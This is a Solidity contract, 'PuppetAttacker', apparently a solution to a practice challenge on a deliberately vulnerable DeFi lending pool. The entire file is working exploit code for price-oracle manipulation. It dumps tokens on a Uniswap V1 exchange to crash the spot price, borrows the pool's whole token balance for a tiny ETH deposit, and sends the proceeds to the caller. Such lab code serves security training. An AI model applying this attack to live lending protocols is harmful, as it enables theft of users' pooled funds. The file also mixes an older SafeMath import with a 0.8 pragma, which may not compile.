 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 
import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title PuppetAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */

interface IPuppetPool {
    function borrow(uint256 borrowAmount) external payable;
    function calculateDepositRequired(uint256 amount) external view returns (uint256);

}

interface IUniswapExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function tokenToEthTransferInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline,
        address recipient
    ) external 
    returns (uint256 tokens_bought);
}

contract PuppetAttacker {
    using SafeMath for uint;
    using Address for address;

    IUniswapExchange uniswap;

    IPuppetPool pool;

    IERC20  token;

    function attack(address _pool, address _uniswap, address _token) public payable {

        pool =IPuppetPool(_pool);

        uniswap = IUniswapExchange(_uniswap);

        token = IERC20 (_token);

        uint tokenToEthAmount = token.balanceOf(address(this));

        uint unisawpEth = tokenToEthUniswap(tokenToEthAmount);
        
        require( unisawpEth > 0 , " tokenToEthTransferInput from uniswap failed");

        uint puppetPoolBalance = token.balanceOf(_pool);

        uint ethAmountRequired = pool.calculateDepositRequired(puppetPoolBalance);

        // atacker contract already had 25 eth and 1000 dvtoken which was swaped to eth by uniswap
        uint attackerEthBalance = address(this).balance;

        require(attackerEthBalance >= ethAmountRequired, "atacker 's eth balance is not enough" );

        pool.borrow {value : attackerEthBalance}(puppetPoolBalance);

        //transfer all the token and eth we gained from the pool to attackerEOA 
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "transfer token to attackerEOA failed");

        payable(msg.sender).transfer(address(this).balance);
    }

    function tokenToEthUniswap(uint tokenAmount) private returns (uint256) {

        token.approve(address(uniswap), type(uint256).max);

        return uniswap.tokenToEthTransferInput (tokenAmount, 1, block.timestamp + 500 seconds, address(this));
    }

    // to receive ETH from uniswap
    receive() external payable {}

}
